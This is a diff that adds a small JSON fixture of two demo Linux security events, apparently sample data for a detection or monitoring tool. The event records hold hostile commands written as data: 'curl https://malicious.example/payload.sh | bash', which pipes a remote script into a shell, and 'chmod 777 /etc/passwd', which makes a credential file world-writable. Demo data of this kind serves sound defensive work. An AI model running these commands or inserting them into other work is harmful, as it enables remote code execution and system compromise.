@@ -1,0 +1,38 @@
+[
+  {
+    "event_id": "linux-demo-001",
+    "host_id": "lin-ubuntu-01",
+    "platform": "linux",
+    "source": "journald",
+    "event_type": "process_start",
+    "occurred_at": "2026-03-26T10:00:00Z",
+    "severity": "critical",
+    "process": {
+      "name": "bash",
+      "pid": 4221,
+      "command_line": "curl https://malicious.example/payload.sh | bash"
+    },
+    "tags": ["demo", "linux", "execution"],
+    "raw_payload": {
+      "service": "auditd"
+    }
+  },
+  {
+    "event_id": "linux-demo-002",
+    "host_id": "lin-ubuntu-01",
+    "platform": "linux",
+    "source": "journald",
+    "event_type": "process_start",
+    "occurred_at": "2026-03-26T10:03:00Z",
+    "severity": "high",
+    "process": {
+      "name": "chmod",
+      "pid": 4228,
+      "command_line": "chmod 777 /etc/passwd"
+    },
+    "tags": ["demo", "linux", "permissions"],
+    "raw_payload": {
+      "service": "auditd"
+    }
+  }
+]
